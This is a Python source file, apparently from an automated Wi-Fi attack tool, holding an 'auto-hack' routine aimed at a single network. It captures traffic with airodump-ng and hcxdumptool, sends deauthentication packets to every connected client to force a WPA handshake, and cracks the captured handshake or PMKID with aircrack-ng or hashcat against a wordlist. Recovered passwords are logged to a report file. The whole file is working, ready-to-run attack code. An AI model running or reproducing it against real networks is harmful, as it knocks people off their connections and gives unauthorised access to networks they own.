"""Auto-hack flow helpers."""

from __future__ import annotations

import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import subprocess
import time

from attacks.commands import aircrack_check, aircrack_crack, airodump_capture, aireplay_deauth, hashcat_crack, hcxdumptool_capture, hcxpcapngtool_convert
from attacks.parsers import extract_hashcat_password_for_bssid, extract_wifi_password, has_aircrack_handshake


def run_auto_hack_single_network(app, bssid, network, session_dir, wordlist, attack_progress=None):
    """Attack one network for auto-hack mode."""
    dump_proc = None
    pmkid_proc = None

    try:
        if network is None:
            network = {}

        ssid = str(network.get("ssid", "Unknown"))
        channel = 1
        try:
            channel = int(network.get("channel", 1))
        except Exception:
            pass

        clients = set()
        try:
            client_data = network.get("clients", [])
            if client_data:
                clients = set(client_data)
        except Exception:
            pass

        cipher = str(network.get("cipher", "Unknown"))

        def _report_attack(elapsed: float = 0, detail: str = "") -> None:
            if attack_progress is None:
                return
            with attack_progress["lock"]:
                attack_progress["active"][bssid] = {
                    "ssid": ssid,
                    "elapsed": int(elapsed),
                    "detail": (detail or "")[:72],
                }

        _report_attack(0, "Starting capture (airodump + hcxdumptool)")
        app.logger.info(f"Starting attack on {ssid} ({bssid})")

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        network_dir = session_dir / f"{ssid}_{bssid.replace(':', '')}"
        network_dir.mkdir(parents=True, exist_ok=True)

        result = {
            "status_message": "Attack in progress",
            "handshake_status": "[yellow]Trying",
            "pmkid_status": "[yellow]Trying",
            "password": None,
            "handshake_file": None,
            "pmkid_file": None,
        }

        handshake_file = network_dir / f"handshake_{timestamp}"
        pmkid_file = network_dir / f"pmkid_{timestamp}"
        pmkid_pcapng = pmkid_file.with_suffix(".pcapng")
        pmkid_22000 = pmkid_file.with_suffix(".22000")

        dump_proc = subprocess.Popen(
            airodump_capture(
                app.interface_name,
                channel=channel,
                bssid=bssid,
                output_prefix=handshake_file,
            ),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
        )

        time.sleep(1)
        if dump_proc.poll() is not None:
            stderr = dump_proc.stderr.read().decode() if dump_proc.stderr else "Unknown error"
            app.logger.error(f"Failed to start airodump-ng for {ssid}: {stderr}")
            result["status_message"] = "[error]Failed to start handshake capture [/]"

        pmkid_proc = subprocess.Popen(
            hcxdumptool_capture(app.interface_name, pmkid_pcapng, channel),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
        )

        time.sleep(1)
        if pmkid_proc.poll() is not None:
            stderr = pmkid_proc.stderr.read().decode() if pmkid_proc.stderr else "Unknown error"
            app.logger.error(f"Failed to start hcxdumptool for {ssid}: {stderr}")
            result["pmkid_status"] = "[red]Failed to start PMKID capture[/]"

        with open(session_dir / "auto_hack_report.txt", "a") as f:
            f.write(f"Attack on {ssid} ({bssid}) started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"  Channel: {channel}\n")
            f.write(f"  Security: {cipher}\n")
            f.write(f"  Clients: {len(clients)}\n")
            f.write(f"  Client MACs: {', '.join(clients) if clients else 'None'}\n")

        if clients:
            with ThreadPoolExecutor(max_workers=min(10, len(clients))) as deauth_executor:
                deauth_tasks = []
                for client in clients:
                    deauth_tasks.append(
                        deauth_executor.submit(
                            subprocess.run,
                            aireplay_deauth(
                                app.interface_name,
                                bssid=bssid,
                                count=5,
                                client=client,
                            ),
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            timeout=10,
                        )
                    )
                for task in concurrent.futures.as_completed(deauth_tasks):
                    try:
                        task.result()
                    except Exception as exc:
                        app.logger.error(f"Deauth error for {ssid}: {str(exc)}")
            _report_attack(0, "Deauth done; capture phase (typically 3-5 min)")
        else:
            _report_attack(0, "No client MACs; capture phase (typically 3-5 min)")

        min_capture_time = 180
        capture_start_time = time.time()
        handshake_found = False
        pmkid_found = False
        password_found = False
        app.logger.info(f"Minimum capture time for {ssid}: {min_capture_time} seconds")

        while True:
            current_time = time.time()
            elapsed_time = current_time - capture_start_time

            if elapsed_time < min_capture_time:
                time_remaining = min_capture_time - elapsed_time
                minutes_remaining = int(time_remaining // 60)
                seconds_remaining = int(time_remaining % 60)
                result["status_message"] = f"Attack in progress - {minutes_remaining:02d}:{seconds_remaining:02d} remaining"
            else:
                result["status_message"] = "Attack in progress - Finalizing"

            if not handshake_found:
                cap_files = list(network_dir.glob(f"{handshake_file.name}*.cap"))
                if cap_files:
                    check_result = subprocess.run(aircrack_check(cap_files[0]), capture_output=True, text=True)
                    if has_aircrack_handshake(check_result.stdout):
                        is_valid_handshake = app._verify_handshake(cap_files[0], bssid, ssid)
                        if is_valid_handshake:
                            handshake_found = True
                            result["handshake_status"] = "[green]Captured"
                            result["handshake_file"] = str(cap_files[0])
                            app.logger.info(f"Verified handshake captured for {ssid} after {elapsed_time:.2f} seconds")
                        else:
                            app.logger.warning(f"Potential handshake found but failed verification for {ssid}")
                            result["handshake_status"] = "[yellow]Needs verification"

            if not pmkid_found and pmkid_pcapng.exists():
                subprocess.run(hcxpcapngtool_convert(pmkid_22000, pmkid_pcapng), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                if pmkid_22000.exists() and pmkid_22000.stat().st_size > 0:
                    is_valid_pmkid = app._verify_pmkid(pmkid_22000, bssid)
                    if is_valid_pmkid:
                        pmkid_found = True
                        result["pmkid_status"] = "[green]Captured"
                        result["pmkid_file"] = str(pmkid_22000)
                        app.logger.info(f"Verified PMKID captured for {ssid} after {elapsed_time:.2f} seconds")
                    else:
                        app.logger.warning(f"Potential PMKID found but failed verification for {ssid}")
                        result["pmkid_status"] = "[yellow]Needs verification"

            if not handshake_found and not pmkid_found and elapsed_time % 30 < 1 and clients:
                app.logger.info(f"Sending additional deauth packets for {ssid}")
                for client in clients:
                    subprocess.run(
                        aireplay_deauth(app.interface_name, bssid=bssid, count=3, client=client),
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )

            if elapsed_time >= min_capture_time and (handshake_found or pmkid_found):
                app.logger.info(f"Early exit for {ssid}: Minimum time reached and data captured")
                break
            if elapsed_time >= 300:
                app.logger.info(f"Maximum capture time reached for {ssid}")
                break

            _report_attack(elapsed_time, result.get("status_message", ""))
            time.sleep(5)

        app.logger.info(f"Capture completed for {ssid} - Handshake: {handshake_found}, PMKID: {pmkid_found}")

        if handshake_found and wordlist:
            _report_attack(time.time() - capture_start_time, "Cracking handshake (aircrack-ng)")
            cap_files = list(network_dir.glob(f"{handshake_file.name}*.cap"))
            if cap_files:
                app.logger.info(f"Attempting to crack handshake for {ssid}")
                crack_result = subprocess.run(aircrack_crack(cap_files[0], wordlist), capture_output=True, text=True)
                password = extract_wifi_password(crack_result.stdout, include_hashcat=False)
                if password:
                    password_found = True
                    result["password"] = password
                    result["status_message"] = "[success]Attack successful - password found."
                    app.logger.info(f"Password found from handshake for {ssid}: {password}")

        if not password_found and pmkid_found and wordlist:
            _report_attack(time.time() - capture_start_time, "Cracking PMKID (hashcat)")
            if pmkid_22000.exists():
                app.logger.info(f"Attempting to crack PMKID for {ssid}")
                hashcat_result = subprocess.run(
                    hashcat_crack(pmkid_22000, wordlist, mode=22000, workload=0, status=True, potfile_disable=True),
                    capture_output=True,
                    text=True,
                )
                password = extract_hashcat_password_for_bssid(hashcat_result.stdout, bssid)
                if password:
                    password_found = True
                    result["password"] = password
                    result["status_message"] = "[success]Attack successful - password found."
                    app.logger.info(f"Password found from PMKID for {ssid}: {password}")

        if not password_found:
            if handshake_found or pmkid_found:
                result["status_message"] = "[warning]Captured data but could not crack password."
                if wordlist:
                    result["status_message"] += " - Try larger wordlist"
            else:
                result["status_message"] = "[error]Attack failed - no handshake or PMKID captured."
                result["handshake_status"] = "[red]Failed"
                result["pmkid_status"] = "[red]Failed"

        with open(session_dir / "auto_hack_report.txt", "a") as f:
            f.write(f"Attack on {ssid} completed at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"  Handshake: {'Captured' if handshake_found else 'Failed'}\n")
            f.write(f"  PMKID: {'Captured' if pmkid_found else 'Failed'}\n")
            f.write(f"  Password: {result['password'] if result['password'] else 'Not found'}\n\n")

        app.logger.info(f"Attack on {ssid} completed. Password found: {password_found}")
        return result

    except Exception as exc:
        error_msg = (
            "Error in _auto_hack_single_network for "
            f"{network.get('ssid', 'Unknown') if isinstance(network, dict) else 'Unknown'}: {str(exc)}"
        )
        app.logger.error(error_msg)
        return {
            "status_message": f"[error]Error: {str(exc)}[/]",
            "handshake_status": "[red]Failed",
            "pmkid_status": "[red]Failed",
            "password": None,
            "handshake_file": None,
            "pmkid_file": None,
        }
    finally:
        if attack_progress is not None:
            with attack_progress["lock"]:
                attack_progress["active"].pop(bssid, None)
        if dump_proc:
            try:
                dump_proc.terminate()
                dump_proc.wait(timeout=1)
            except Exception:
                try:
                    dump_proc.kill()
                    dump_proc.wait(timeout=1)
                except Exception:
                    pass

        if pmkid_proc:
            try:
                pmkid_proc.terminate()
                try:
                    pmkid_proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    pmkid_proc.kill()
                    try:
                        pmkid_proc.wait(timeout=2)
                    except Exception:
                        pass
            except Exception:
                try:
                    subprocess.run(["pkill", "-9", "-f", f"hcxdumptool.*{bssid}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except Exception:
                    pass

